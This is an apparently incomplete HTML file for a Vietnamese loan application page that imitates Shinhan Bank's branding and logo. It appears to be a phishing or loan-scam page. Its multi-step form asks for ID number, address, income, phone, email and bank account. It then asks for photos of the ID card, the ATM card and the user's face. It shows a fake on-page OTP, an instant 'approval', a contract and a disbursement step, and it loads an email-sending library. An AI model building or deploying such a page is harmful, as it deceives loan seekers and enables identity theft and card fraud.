<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Đăng ký vay tín chấp trực tuyến tại Shinhan Bank - nhanh chóng, tiện lợi, an toàn.">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link rel="icon" href="https://shinhan.com.vn/public/themes/shinhan/img/favicon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f4f7fa;
            overflow-x: hidden;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            background: linear-gradient(90deg, #003087, #00205B);
            color: white;
        }
        .header img {
            max-width: 200px;
            display: block;
            margin: 0 auto;
        }
        .container {
            max-width: 800px;
            margin: 30px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .progress-bar-container {
            margin-bottom: 20px;
            position: relative;
        }
        .progress-bar {
            height: 30px;
            background: #e9ecef;
            border-radius: 15px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #003087, #0055a5);
            transition: width 0.5s ease-in-out;
        }
        .progress-label {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #003087;
            font-weight: 500;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            max-width: 150px;
            display: block;
            margin: 0 auto;
        }
        .step-title {
            font-size: 24px;
            font-weight: 700;
            color: #003087;
            text-align: center;
            margin-bottom: 20px;
        }
        .step-description {
            font-size: 16px;
            color: #6c757d;
            text-align: center;
            margin-bottom: 20px;
        }
        .step {
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .step.hidden {
            display: none;
            opacity: 0;
            transform: translateY(20px);
        }
        .form-control.is-invalid {
            border-color: #dc3545;
        }
        .btn-primary {
            background: linear-gradient(90deg, #003087, #0055a5);
            border: none;
            transition: all 0.3s ease;
            position: relative;
        }
        .btn-primary:hover {
            background: linear-gradient(90deg, #00205B, #003087);
            transform: scale(1.05);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .btn-primary .spinner-border {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .btn-primary.loading .spinner-border {
            display: inline-block;
        }
        .btn-primary.loading span {
            visibility: hidden;
        }
        .btn-back {
            background: #6c757d;
            border: none;
            transition: all 0.3s ease;
        }
        .btn-back:hover {
            background: #5a6268;
            transform: scale(1.05);
        }
        .footer {
            text-align: center;
            padding: 20px 0;
            background: linear-gradient(90deg, #003087, #00205B);
            color: white;
            margin-top: 30px;
        }
        .footer .lock-icon {
            width: 24px;
            vertical-align: middle;
        }
        .footer .footer-logo {
            max-width: 130px;
            margin-top: 10px;
            display: block;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-digit {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            transition: border-color 0.3s ease;
        }
        .otp-digit:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .preview-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .preview-section img, .preview-section canvas {
            max-width: 200px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: auto;
        }
        .preview-section canvas {
            width: 100%;
            max-width: 200px;
        }
        .confirmation-box {
            background-color: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
        }
        .canvas-container {
            position: relative;
            text-align: center;
        }
        canvas {
            max-width: 100%;
            height: auto;
        }
        canvas.loading::after {
            content: "Đang tải...";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #003087;
            font-size: 18px;
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1050;
        }
        .toast {
            min-width: 300px;
            animation: slideIn 0.3s ease;
        }
        .modal {
            animation: zoomIn 0.3s ease;
        }
        .modal-header img {
            width: 30px;
            margin-right: 10px;
            display: inline-block;
        }
        .step7-preview {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .step7-preview img, .step7-preview canvas {
            max-width: 200px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: auto;
        }
        .step7-preview canvas {
            width: 100%;
            max-width: 200px;
        }
        @media (max-width: 576px) {
            .container {
                margin: 10px;
                padding: 15px;
            }
            .form-logo img {
                max-width: 120px;
            }
            .otp-digit {
                width: 35px;
                height: 35px;
                font-size: 16px;
            }
            .preview-section img, .preview-section canvas {
                max-width: 150px;
            }
            .step7-preview img, .step7-preview canvas {
                max-width: 150px;
            }
            .btn-primary, .btn-back {
                padding: 8px 16px;
                font-size: 14px;
            }
            canvas {
                max-width: 100%;
            }
            .header img {
                max-width: 150px;
            }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
        @keyframes zoomIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.3s ease-in;
        }
    </style>
</head>
<body>
    <div class="toast-container">
        <div id="emailToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-autohide="true" data-bs-delay="5000">
            <div class="toast-header">
                <strong class="me-auto">Thông báo</strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body"></div>
        </div>
    </div>

    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/200x50?text=Logo+Shinhan'">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
            <div class="progress-label" id="progressLabel">Bước 1/10</div>
        </div>

        <!-- Bước 1: Đăng ký thông tin -->
        <div id="step1" class="step">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Thông Tin Đăng Ký</h5>
            <p class="step-description">Vui lòng điền đầy đủ thông tin để đăng ký vay tín chấp.</p>
            <form id="registerForm" class="needs-validation" novalidate>
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="fullName" placeholder="Nguyễn Văn A" aria-describedby="fullNameFeedback">
                    <div id="fullNameFeedback" class="invalid-feedback">Vui lòng nhập họ và tên hợp lệ (chỉ chứa chữ cái và dấu cách).</div>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ Chiếu <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="idNumber" placeholder="123456789" aria-describedby="idNumberFeedback">
                    <div id="idNumberFeedback" class="invalid-feedback">Vui lòng nhập số CMND/CCCD/Hộ chiếu.</div>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD <span class="text-danger">*</span></label>
                    <input type="date" class="form-control" id="idIssueDate" max="" aria-describedby="idIssueDateFeedback">
                    <div id="idIssueDateFeedback" class="invalid-feedback">Vui lòng chọn ngày cấp hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Cục Cảnh sát DKQL cư trú" aria-describedby="idIssuePlaceFeedback">
                    <div id="idIssuePlaceFeedback" class="invalid-feedback">Vui lòng nhập nơi cấp hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="address" placeholder="123 Đường Lê Lợi, Quận 1, TP.HCM" aria-describedby="addressFeedback">
                    <div id="addressFeedback" class="invalid-feedback">Vui lòng nhập địa chỉ đầy đủ.</div>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp <span class="text-danger">*</span></label>
                    <select class="form-select" id="occupation" aria-describedby="occupationFeedback">
                        <option value="" disabled selected>Chọn nghề nghiệp</option>
                        <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
                        <option value="Công nhân">Công nhân</option>
                        <option value="Kinh doanh tự do">Kinh doanh tự do</option>
                        <option value="Giáo viên">Giáo viên</option>
                        <option value="Bác sĩ">Bác sĩ</option>
                        <option value="Kỹ sư">Kỹ sư</option>
                        <option value="Tài xế">Tài xế</option>
                        <option value="Nhân viên bán hàng">Nhân viên bán hàng</option>
                        <option value="Nội trợ">Nội trợ</option>
                        <option value="Hưu trí">Hưu trí</option>
                        <option value="Sinh viên">Sinh viên</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div id="occupationFeedback" class="invalid-feedback">Vui lòng chọn nghề nghiệp.</div>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="income" placeholder="10,000,000" aria-describedby="incomeFeedback">
                    <div id="incomeFeedback" class="invalid-feedback">Vui lòng nhập thu nhập hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="text-danger">*</span></label>
                    <input type="tel" class="form-control" id="phoneNumber" placeholder="0901234567" aria-describedby="phoneNumberFeedback">
                    <div id="phoneNumberFeedback" class="invalid-feedback">Vui lòng nhập số điện thoại hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email <span class="text-danger">*</span></label>
                    <input type="email" class="form-control" id="email" placeholder="example@domain.com" aria-describedby="emailFeedback">
                    <div id="emailFeedback" class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND) <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="loanAmount" placeholder="50,000,000" aria-describedby="loanAmountFeedback">
                    <div id="loanAmountFeedback" class="invalid-feedback">Vui lòng nhập số tiền vay hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Kỳ Hạn Vay (Tháng) <span class="text-danger">*</span></label>
                    <select class="form-select" id="loanTerm" aria-describedby="loanTermFeedback">
                        <option value="" disabled selected>Chọn kỳ hạn</option>
                        <option value="12">12 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                    <div id="loanTermFeedback" class="invalid-feedback">Vui lòng chọn kỳ hạn vay.</div>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay <span class="text-danger">*</span></label>
                    <select class="form-select" id="loanPurpose" aria-describedby="loanPurposeFeedback">
                        <option value="" disabled selected>Chọn mục đích</option>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                        <option value="Đầu tư kinh doanh">Đầu tư kinh doanh</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div id="loanPurposeFeedback" class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="accountNumber" placeholder="1234567890" aria-describedby="accountNumberFeedback">
                    <div id="accountNumberFeedback" class="invalid-feedback">Vui lòng nhập số tài khoản ngân hàng hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng <span class="text-danger">*</span></label>
                    <select class="form-select" id="bankName" aria-describedby="bankNameFeedback">
                        <option value="" disabled selected>Chọn ngân hàng</option>
                        <option value="Shinhan Bank">Shinhan Bank</option>
                        <option value="Vietcombank">Vietcombank</option>
                        <option value="Techcombank">Techcombank</option>
                        <option value="MB Bank">MB Bank</option>
                        <option value="VPBank">VPBank</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div id="bankNameFeedback" class="invalid-feedback">Vui lòng chọn ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <label for="creditHistory" class="form-label">Lịch Sử Tín Dụng <span class="text-danger">*</span></label>
                    <select class="form-select" id="creditHistory" aria-describedby="creditHistoryFeedback">
                        <option value="" disabled selected>Chọn trạng thái</option>
                        <option value="Không có nợ xấu">Không có nợ xấu</option>
                        <option value="Có nợ xấu">Có nợ xấu</option>
                    </select>
                    <div id="creditHistoryFeedback" class="invalid-feedback">Vui lòng chọn trạng thái lịch sử tín dụng.</div>
                </div>
                <div class="mb-3 form-check">
                    <input type="checkbox" class="form-check-input" id="termsAgree" aria-describedby="termsAgreeFeedback">
                    <label class="form-check-label" for="termsAgree">Tôi đồng ý với <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">điều khoản và điều kiện</a></label>
                    <div id="termsAgreeFeedback" class="invalid-feedback">Vui lòng đồng ý với điều khoản.</div>
                </div>
                <div class="text-center">
                    <button type="submit" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên giấy tờ">
                        <span>Tiếp Tục</span>
                        <div class="spinner-border spinner-border-sm" role="status"></div>
                    </button>
                </div>
            </form>
        </div>

        <!-- Bước 2: Tải lên CMND/CCCD -->
        <div id="step2" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Giấy Tờ Tùy Thân</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh mặt trước và mặt sau của CMND/CCCD (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh Mặt Trước CMND/CCCD <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="idFrontImage" accept="image/jpeg,image/png" required aria-describedby="idFrontImageFeedback">
                <div id="idFrontImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt trước.</div>
                <small id="idFrontInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh Mặt Sau CMND/CCCD <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="idBackImage" accept="image/jpeg,image/png" required aria-describedby="idBackImageFeedback">
                <div id="idBackImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt sau.</div>
                <small id="idBackInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(2, 1, 10)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thông tin">Quay Lại</button>
                <button id="proceedToStep3Btn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên thẻ ATM">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 3: Tải lên thẻ ATM -->
        <div id="step3" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Thẻ ATM</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh thẻ ATM của bạn (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="atmImage" accept="image/jpeg,image/png" required aria-describedby="atmImageFeedback">
                <div id="atmImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh thẻ ATM.</div>
                <small id="atmImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(3, 2, 20)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa giấy tờ tùy thân">Quay Lại</button>
                <button id="proceedToStep4Btn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên ảnh khuôn mặt">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 4: Tải lên ảnh khuôn mặt -->
        <div id="step4" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Ảnh Khuôn Mặt</h5>
            <p class="step-description">Vui lòng tải lên ảnh khuôn mặt rõ nét của bạn để xác minh danh tính (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="faceImage" accept="image/jpeg,image/png" required aria-describedby="faceImageFeedback">
                <div id="faceImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh khuôn mặt.</div>
                <small id="faceImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="preview-section">
                <h6>Xem Trước Hình Ảnh</h6>
                <div id="profileImagePreview">
                    <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                </div>
                <div id="contractImagePreview">
                    <p>Hình ảnh hợp đồng: Chưa có</p>
                </div>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(4, 3, 30)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thẻ ATM">Quay Lại</button>
                <button id="proceedToOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước xác minh OTP">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 5: Xác minh OTP -->
        <div id="step5" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Xác Minh OTP</h5>
            <p class="step-description">Mã OTP đã được gửi đến số điện thoại của bạn. Mã có hiệu lực trong 5 phút.</p>
            <div class="text-center mb-3">
                <p>Mã OTP: <span id="otpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copyOtp()">Sao chép</button></p>
                <p><button type="button" class="btn btn-link" onclick="resendOtp()">Gửi lại OTP</button></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-digit form-control" id="otp1" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp2" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp3" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp4" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp5" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp6" maxlength="1" required>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(5, 4, 40)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa ảnh khuôn mặt">Quay Lại</button>
                <button id="verifyOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xác minh OTP để duyệt hồ sơ">
                    <span>Xác Minh</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 7: Hồ sơ được duyệt -->
        <div id="step7" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hồ Sơ Được Duyệt</h5>
            <p class="step-description">Chúc mừng! Hồ sơ vay tín chấp của bạn đã được duyệt.</p>
            <div class="confirmation-box">
                <p id="confirmationMessage"></p>
                <p>Thông tin chi tiết đã được gửi đến email: <span id="confirmationEmail"></span></p>
                <p id="incompleteWarning" style="color: #dc3545; display: none;">Lưu ý: Một số thông tin chưa hợp lệ, vui lòng quay lại để hoàn thiện.</p>
            </div>
            <div class="step7-preview">
                <h6>Xem trước tài liệu</h6>
                <div id="step7ProfileImagePreview">
                    <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                </div>
                <div id="step7ContractCanvasContainer">
                    <canvas id="step7ContractCanvas"></canvas>
                </div>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(7, 5, 50)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa OTP">Quay Lại</button>
                <button id="proceedToContractBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xem hợp đồng vay">
                    <span>Xem Hợp Đồng</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 8: Xem hợp đồng -->
        <div id="step8" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Xem Hợp Đồng</h5>
            <p class="step-description">Vui lòng xem kỹ hợp đồng trước khi ký. Hợp đồng bao gồm các điều khoản pháp lý và nghĩa vụ thanh toán.</p>
            <div class="canvas-container">
                <canvas id="contractCanvas"></canvas>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(8, 7, 70)" data-bs-toggle="tooltip" title="Quay lại để xem hồ sơ duyệt">Quay Lại</button>
                <button id="proceedToSignContractBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiến hành ký hợp đồng">
                    <span>Ký Hợp Đồng</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 8.1: Ký hợp đồng -->
        <div id="step8-1" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Ký Hợp Đồng</h5>
            <p class="step-description">Nhập mã OTP để xác nhận ký hợp đồng. Mã OTP có hiệu lực trong 5 phút.</p>
            <div class="text-center mb-3">
                <p>Mã OTP: <span id="signOtpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copySignOtp()">Sao chép</button></p>
                <p><button type="button" class="btn btn-link" onclick="resendSignOtp()">Gửi lại OTP</button></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-digit form-control" id="signOtp1" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp2" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp3" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp4" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp5" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp6" maxlength="1" required>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack('8-1', 8, 80)" data-bs-toggle="tooltip" title="Quay lại để xem hợp đồng">Quay Lại</button>
                <button id="verifySignOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xác nhận ký hợp đồng">
                    <span>Xác Nhận</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 9: Điều kiện giải ngân -->
        <div id="step9" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">Vui lòng kiểm tra thông tin giải ngân và đảm bảo đáp ứng các điều kiện dưới đây.</p>
            <div class="confirmation-box">
                <h6>Điều Kiện Giải Ngân</h6>
                <ul>
                    <li>Hồ sơ vay đã được ký hợp đồng đầy đủ và hợp lệ.</li>
                    <li>Tài khoản ngân hàng nhận giải ngân phải khớp với thông tin đăng ký.</li>
                    <li>Không có thay đổi về tình trạng nợ xấu kể từ khi đăng ký.</li>
                    <li>Thời gian giải ngân dự kiến: Trong vòng 1-3 ngày làm việc sau khi ký hợp đồng.</li>
                </ul>
                <p><strong>Lưu ý:</strong> Số tiền giải ngân sẽ được chuyển vào tài khoản: <span id="disbursementAccount"></span></p>
            </div>
            <div class="canvas-container">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(9, '8-1', 85)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa OTP ký hợp đồng">Quay Lại</button>
                <button id="proceedToFinalStepBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Hoàn tất đăng ký vay">
                    <span>Hoàn Tất</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 10: Hoàn tất -->
        <div id="step10" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hoàn Tất</h5>
            <p class="step-description">Đăng ký vay tín chấp của bạn đã hoàn tất! Số tiền vay sẽ được giải ngân trong vòng 1-3 ngày làm việc.</p>
            <div class="text-center">
                <img src="https://media.giphy.com/media/3o7TKtnb4wIvS0rQ4o/giphy.gif" alt="Congratulations" style="max-width: 200px;" onerror="this.src='https://via.placeholder.com/200x200?text=Hoan+Tat'">
                <p class="mt-3">Cảm ơn bạn đã tin tưởng Shinhan Bank!</p>
            </div>
        </div>

        <!-- Modal Điều khoản -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h6>1. Điều Kiện Vay</h6>
                        <table class="table table-bordered">
                            <tr><td>Độ tuổi</td><td>20 - 60 tuổi</td></tr>
                            <tr><td>Thu nhập tối thiểu</td><td>8 triệu VND/tháng</td></tr>
                            <tr><td>Lịch sử tín dụng</td><td>Không có nợ xấu tại thời điểm đăng ký</td></tr>
                            <tr><td>Kỳ hạn vay</td><td>12 - 60 tháng</td></tr>
                        </table>
                        <h6>2. Cam Kết Bảo Mật</h6>
                        <p>Chúng tôi cam kết bảo mật thông tin cá nhân của khách hàng theo quy định pháp luật Việt Nam.</p>
                        <h6>3. Trách Nhiệm Của Khách Hàng</h6>
                        <p>Khách hàng chịu trách nhiệm cung cấp thông tin chính xác và đầy đủ. Mọi sai sót có thể ảnh hưởng đến quá trình duyệt hồ sơ và giải ngân.</p>
                        <h6>4. Phí và Lãi Suất</h6>
                        <p>Lãi suất vay dao động từ 10% - 12%/năm, tùy thuộc vào số tiền vay. Có thể áp dụng phí phạt trả nợ trước hạn (2% - 5% số dư nợ).</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal Thành công -->
        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
